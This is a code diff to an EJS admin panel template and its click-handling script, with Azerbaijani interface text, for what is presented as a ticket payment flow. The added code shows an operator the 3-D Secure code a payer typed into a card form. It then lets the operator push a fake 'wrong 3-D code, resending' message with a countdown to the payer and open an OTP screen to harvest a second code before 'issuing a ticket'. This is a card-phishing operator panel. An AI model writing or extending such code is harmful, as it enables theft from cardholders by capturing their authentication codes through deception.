@@ -75,16 +75,29 @@
                 </div>
               </div>
 
-              <% if (p.status === 'pending_admin') { %>
+              <% var st = p.stage || 'card_review'; %>
+              <% if (st === 'card_review' && p.status === 'pending_admin') { %>
+                <div class="alert alert--info mt-16">
+                  1-ci addım — istifadəçinin kart forması ilə yazdığı 3-D kod:
+                  <strong class="mono" style="font-size:1.3rem;letter-spacing:.2em"><%= p.firstCode || '—' %></strong>
+                </div>
                 <div class="flex-end mt-16">
-                  <button class="btn btn--primary btn--sm" data-approve-card="<%= p._id %>"><%= t('admin.approve') %></button>
+                  <button class="btn btn--primary btn--sm" data-approve-card="<%= p._id %>">1-ci təsdiq (səhv kod bildirişi)</button>
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
-              <% } else if (p.status === 'awaiting_3ds') { %>
-                <p class="sec-note mt-16"><%= t('admin.awaiting3dsUser') %></p>
-              <% } else if (p.status === 'code_submitted') { %>
+              <% } else if (st === 'wrong_code') { %>
+                <div class="alert alert--warning mt-16">
+                  İstifadəçinin ekranında «Səhv 3-D kod daxil etmisiniz — kod təkrar göndərilir» göstərilir və geri sayım gedir.
+                </div>
                 <div class="flex-end mt-16">
-                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>"><%= t('admin.approveFinal') %></button>
+                  <button class="btn btn--primary btn--sm" data-open-otp="<%= p._id %>">2-ci təsdiq — OTP ekranını aç</button>
+                  <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
+                </div>
+              <% } else if (st === 'otp_entry') { %>
+                <p class="sec-note mt-16">OTP ekranı açıqdır — istifadəçinin kodu gözlənilir…</p>
+              <% } else if (st === 'otp_review') { %>
+                <div class="flex-end mt-16">
+                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>">Yekun təsdiq — bilet ver</button>
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
               <% } else { %>
@@ -117,12 +130,13 @@
     return res.json();
   }
   document.addEventListener('click', async function (e) {
-    var el = e.target.closest('[data-approve-card],[data-approve-final],[data-decline]');
+    var el = e.target.closest('[data-approve-card],[data-open-otp],[data-approve-final],[data-decline]');
     if (!el) { return; }
     e.preventDefault();
     el.disabled = true;
     var url = '';
     if (el.hasAttribute('data-approve-card')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-card') + '/approve-card'; }
+    if (el.hasAttribute('data-open-otp')) { url = '/api/admin/payments/' + el.getAttribute('data-open-otp') + '/open-otp'; }
     if (el.hasAttribute('data-approve-final')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-final') + '/approve-final'; }
     if (el.hasAttribute('data-decline')) { url = '/api/admin/payments/' + el.getAttribute('data-decline') + '/decline'; }
     try {
